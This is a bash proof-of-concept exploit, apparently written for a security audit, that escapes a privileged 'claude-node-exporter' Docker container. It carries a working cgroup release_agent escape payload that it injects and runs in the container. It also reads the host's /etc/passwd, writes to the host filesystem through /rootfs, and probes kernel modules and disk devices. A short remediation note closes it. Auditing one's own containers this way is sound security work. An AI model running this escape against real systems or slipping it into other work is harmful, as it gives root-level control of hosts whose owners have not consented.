#!/bin/bash
#
# Exploit: Privileged Container Escape
# Target: node-exporter container with privileged:true
# Impact: Full host system compromise
#

echo "======================================="
echo "Privileged Container Escape Exploit"
echo "======================================="

CONTAINER_NAME="claude-node-exporter"

# Check if container is running
if ! docker ps | grep -q "$CONTAINER_NAME"; then
    echo "[-] Container $CONTAINER_NAME not found"
    echo "[*] Start the monitoring stack first: ./manage.sh up"
    exit 1
fi

echo "[*] Found target container: $CONTAINER_NAME"

# Method 1: Classic privileged escape via cgroups
echo -e "\n[*] Method 1: cgroup escape technique..."

cat > /tmp/container_escape.sh << 'EOF'
#!/bin/sh
# Container escape payload

echo "[*] Inside container, attempting escape..."

# Check if we're privileged
if [ ! -w /sys/kernel ]; then
    echo "[-] Container is not privileged"
    exit 1
fi

# cgroup escape technique
mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Find path to container root on host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/exploit" > /tmp/cgrp/release_agent

# Create exploit script on host
cat > /exploit << 'EXPLOIT'
#!/bin/sh
# This runs on the host!
echo "[+] Escaped to host at $(date)" > /rootfs/tmp/container_escaped.proof
id >> /rootfs/tmp/container_escaped.proof
hostname >> /rootfs/tmp/container_escaped.proof
ps aux | head -20 >> /rootfs/tmp/container_escaped.proof
EXPLOIT

chmod a+x /exploit

# Trigger the exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

echo "[*] Escape attempt completed"
EOF

echo "[*] Injecting escape payload..."
docker cp /tmp/container_escape.sh $CONTAINER_NAME:/tmp/escape.sh
docker exec $CONTAINER_NAME chmod +x /tmp/escape.sh
docker exec $CONTAINER_NAME /tmp/escape.sh

# Wait for exploit to trigger
sleep 3

# Check if escape worked
if [ -f /tmp/container_escaped.proof ]; then
    echo "[+] Container escape successful!"
    echo "[+] Proof of host compromise:"
    cat /tmp/container_escaped.proof
    rm -f /tmp/container_escaped.proof
else
    echo "[-] Method 1 failed"
fi

# Method 2: Direct host filesystem access
echo -e "\n[*] Method 2: Direct filesystem access..."

echo "[*] The container mounts host root at /rootfs"
echo "[*] Checking host files through container..."

docker exec $CONTAINER_NAME ls -la /rootfs/etc/passwd > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "[+] Can read host filesystem!"
    echo "[+] Host /etc/passwd:"
    docker exec $CONTAINER_NAME head -5 /rootfs/etc/passwd
    
    echo -e "\n[+] Host processes visible:"
    docker exec $CONTAINER_NAME ps aux | head -5
    
    # Try to write to host
    docker exec $CONTAINER_NAME sh -c 'echo "Container was here" > /rootfs/tmp/container_write_test 2>/dev/null'
    if [ -f /tmp/container_write_test ]; then
        echo "[+] Can write to host filesystem!"
        rm -f /tmp/container_write_test
    fi
fi

# Method 3: Kernel module loading (if possible)
echo -e "\n[*] Method 3: Checking kernel access..."

docker exec $CONTAINER_NAME sh -c 'ls /sys/module/ | wc -l' > /tmp/kmod_count 2>&1
if [ -s /tmp/kmod_count ]; then
    count=$(cat /tmp/kmod_count)
    echo "[+] Can see $count kernel modules"
    echo "[*] Full kernel access possible from privileged container"
fi

# Method 4: Device access
echo -e "\n[*] Method 4: Checking device access..."

docker exec $CONTAINER_NAME ls -la /dev/sd* 2>/dev/null | head -5
if [ $? -eq 0 ]; then
    echo "[+] Direct disk device access available!"
    echo "[!] Could mount and modify host disks"
fi

# Cleanup
rm -f /tmp/container_escape.sh /tmp/kmod_count

echo -e "\n[!] Vulnerability Summary:"
echo "    - Container runs with --privileged flag"
echo "    - Full host root filesystem mounted at /rootfs"
echo "    - Access to all devices and kernel features"
echo "    - Can escape to host and execute arbitrary commands"
echo -e "\n[!] Fix: Remove 'privileged: true' and use specific capabilities"